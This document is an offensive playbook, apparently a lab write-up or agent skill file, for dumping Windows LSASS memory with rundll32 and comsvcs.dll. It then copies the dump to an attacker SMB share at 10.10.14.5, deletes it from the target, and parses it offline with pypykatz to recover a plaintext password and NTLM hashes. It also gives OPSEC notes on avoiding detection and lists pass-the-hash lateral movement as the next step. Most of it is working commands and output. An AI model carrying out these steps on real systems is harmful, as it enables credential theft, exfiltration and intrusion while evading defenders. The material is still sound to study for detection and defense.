# LSASS Dump and Offline Parsing

## Scenario
Local admin on Windows 10 workstation, need to extract credentials without running mimikatz on disk.

## Step 1: Dump LSASS via comsvcs.dll (LOLBin — no tools required)
```powershell
PS C:\> tasklist /fi "imagename eq lsass.exe"

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
lsass.exe                      684 Services                   0     52,432 K

PS C:\> rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 684 C:\Windows\Temp\debug.dmp full
```

## Step 2: Transfer Dump to Attacker
```bash
# From attacker (using impacket-smbserver)
$ impacket-smbserver share /tmp/loot -smb2support

# From target
PS C:\> copy C:\Windows\Temp\debug.dmp \\10.10.14.5\share\lsass.dmp
PS C:\> del C:\Windows\Temp\debug.dmp
```

## Step 3: Parse Offline with pypykatz
```bash
$ pypykatz lsa minidump lsass.dmp

== LogonSession ==
authentication_id        389621 (5f1f5)
session_id               1
username                 admin
domainname               WORKSTATION01
logon_server             DC01
logon_time               2025-01-15T10:22:15+00:00
sid                      S-1-5-21-3456789012-1234567890-9876543210-1001
luid                     389621

        == MSV ==
                Username: admin
                Domain: MEGACORP
                LM: NA
                NT: aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b
                SHA1: da39a3ee5e6b4b0d3255bfef95601890afd80709

        == WDIGEST ==
                Username: admin
                Domain: MEGACORP
                Password: Adm1nP@ss2024!

        == Kerberos ==
                Username: admin
                Domain: MEGACORP.LOCAL
                Password: Adm1nP@ss2024!

        == TSPKG ==
                Username: admin
                Domain: MEGACORP
                Password: Adm1nP@ss2024!

== LogonSession ==
authentication_id        999 (3e7)
session_id               0
username                 WORKSTATION01$
domainname               MEGACORP
logon_server
logon_time               2025-01-15T08:00:01+00:00
sid                      S-1-5-18

        == MSV ==
                Username: WORKSTATION01$
                Domain: MEGACORP
                NT: aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6
```

## Credentials Extracted
| User | Type | Value | Domain |
|------|------|-------|--------|
| admin | Plaintext (WDigest) | Adm1nP@ss2024! | MEGACORP |
| admin | NTLM Hash | 64f12cddaa88057e06a81b54e73b949b | MEGACORP |
| WORKSTATION01$ | Machine NTLM | a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 | MEGACORP |

## OPSEC Notes
- Used comsvcs.dll (LOLBin) — no mimikatz binary on disk
- Dump transferred via SMB, then deleted from target
- Parsing done offline on attacker machine — zero detection risk
- WDigest was enabled (common on older domains or misconfigured GPO)

## Next Steps
→ **lateral_movement skill**: PTH with admin NTLM to other workstations
→ **lateral_movement skill**: Use plaintext creds for RDP, WinRM, SSH
→ **credential_access skill**: Test password reuse across domain
